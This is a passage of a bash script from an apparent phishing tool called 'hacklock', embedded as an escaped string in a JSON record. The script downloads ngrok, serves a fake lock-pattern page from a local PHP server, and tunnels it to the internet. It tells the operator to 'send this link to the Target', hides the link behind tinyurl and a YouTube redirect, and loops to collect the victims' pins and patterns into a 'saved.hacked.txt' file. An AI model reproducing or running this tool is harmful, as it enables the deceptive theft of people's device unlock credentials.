Pattern-pin:\\e[0m\\e[1;77m %s\\n\\e[0m\" $password\ncat $HOME/hacklock/core/pattern/usernames.txt >> $HOME/hacklock/core/pattern/saved.hacked.txt\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Saved:\\e[0m\\e[1;77m core/main/saved.hacked.txt\\e[0m\\n\"\nprintf \"\\n\"\nprintf \"\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Waiting For Next Pin, Press Ctrl + C to exit...\\e[0m\\n\"\n}\n\n####### Server start/run #######\nstart() {\nif [[ -e \"$HOME/hacklock/core/pattern/ip.txt\" ]]; then\nrm -rf $HOME/hacklock/core/pattern/ip.txt\nfi\n\nif [[ -e \"$HOME/hacklock/core/pattern/usernames.txt\" ]]; then\nrm -rf $HOME/hacklock/core/pattern/usernames.txt\nfi\n\nif [[ -e \"$HOME/hacklock/ngrok\" ]]; then\necho \" \"\nelse\ncd $HOME/hacklock\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] Downloading Ngrok...\\n\"\nwget -O ngrok https://github.com/noob-hackers/mrphish/raw/master/core/ngrok > /dev/null 2>&1\nsleep 20\nif [[ -e \"$HOME/hacklock/ngrok\" ]]; then\nchmod +x ngrok\nsleep 2.0\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] Ngrok downloaded successfully.\\n\"\nelse\nprintf \"\\e[1;93m[!] Download error... \\e[0m\\n\"\nexit 1\nfi\nfi\n\n####### Server start process #######\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] Starting php server...\\n\"\ncd $HOME/hacklock/core/pattern && php -S 127.0.0.1:5678 > /dev/null 2>&1 & \nsleep 5\n\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] Starting ngrok server...\\n\"\n./ngrok http 127.0.0.1:5678 > /dev/null 2>&1 &\nsleep 20\n\nlink=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o \"https://[0-9A-Za-z.-]*\\.ngrok.io\")\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] Send this link to the Target:\\e[0m\\e[1;77m %s\\e[0m\\n\" $link\nsend_ip=$(curl -s \"http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link\" | head -n1)\nprintf '\\n\\e[1;93m[\\e[0m\\e[1;77m*\\e[0m\\e[1;93m] Or using tinyurl:\\e[0m\\e[1;77m %s \\n' $send_ip\nprintf \"\\n\"\ncheckfound\n}\n\n####### Remove sendlink file #######\nstart1() {\nif [[ -e sendlink ]]; then\nrm -rf sendlink\nfi\nstart\n}\n\n####### Fix ngrok issue #######\nfixer(){\nclear\ncd $HOME\nls -a >/dev/null 2>&1\nrm -rf .ngrok2 >/dev/null 2>&1\nprintf \"\\e[1;92m WATCH THIS VIDEO www.noob-hackers.com\\e[0m\\n\"\nread -p $'\\n\\e[1;96m[\\e[0m\\e[1;92m+\\e[0m\\e[1;96m] NGROK AUTH CODE : \\e[0m' name\n./ngrok authtoken $name >/dev/null 2>&1\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] NGROK FIXED SUCCESSFULLY:\\e[0m\\e[1;77m %s\\e[0m\\n\"\nprintf \"\\e[1;92m[\\e[0m*\\e[1;92m] IF ITS NOT SOLVED THEN USE OPTION CHAT\\e[0m\\e[1;77m %s\\e[0m\\n\"\nsleep 6.0\nexit 1\n}\n\n####### Check found data #######\ncheckfound() {\nprintf \"\\n\"\nprintf \"\\e[1;92m[\\e[0m\\e[1;77m*\\e[0m\\e[1;92m] Waiting For Pin,\\e[0m\\e[1;77m Press Ctrl + C to exit...\\e[0m\\n\"\nwhile [ true ]; do\nif [[ -e \"$HOME/hacklock/core/pattern/usernames.txt\" ]]; then\nprintf \"\\n\\e[1;93m[\\e[0m*\\e[1;93m]\\e[0m\\e[1;92m Pattern  Found!\\n\"\ncatch_cred\nrm -rf $HOME/hacklock/core/pattern/usernames.txt\nfi\nsleep 0.5\ndone \n}\n\n####### Restart the tool #######\nbanner\ndependencies\nmenu\n"
        }
      ]
    }
  ]
}